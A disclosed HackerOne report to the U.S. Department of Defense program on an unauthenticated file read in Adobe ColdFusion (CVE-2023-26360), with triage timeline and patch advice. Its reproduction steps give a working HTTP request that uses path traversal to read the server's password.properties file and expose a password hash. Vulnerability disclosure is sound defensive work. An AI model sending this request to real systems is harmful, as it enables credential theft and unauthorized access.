---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2023-12-21
submitted: 2023-11-11T17:02:47.273Z
bounty_usd: null
votes: 11
cve: "CVE-2023-26360"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "r00tdaddy"
source: "https://hackerone.com/reports/2248781"
title: "Unauthenticated File Read Adobe ColdFusion"
---
# Unauthenticated File Read Adobe ColdFusion

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 11 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2023-12-21

- Report: [https://hackerone.com/reports/2248781](https://hackerone.com/reports/2248781)
- CWE: Improper Access Control - Generic | CVE: CVE-2023-26360
- Submitted: 2023-11-11T17:02:47.273Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Unauthenticated Arbitrary File Read vulnerability due to de serialization of untrusted data in Adobe ColdFusion.

## Impact

The impact of this vulnerability could result in unauthorized access to sensitive data and actions within the affected Adobe ColdFusion instances.

## System Host(s)
█████████

## Affected Product(s) and Version(s)
The vulnerability affects ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier

## CVE Numbers
CVE-2023-26360

## Steps to Reproduce
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1
Host: ███
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d

Password hash is disclosed in the response:

## Suggested Mitigation/Remediation Actions
Apply the necessary security patches or updates provided by Adobe to fix the vulnerability.

## Timeline

- **Report Filed**
- **2023-11-11** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
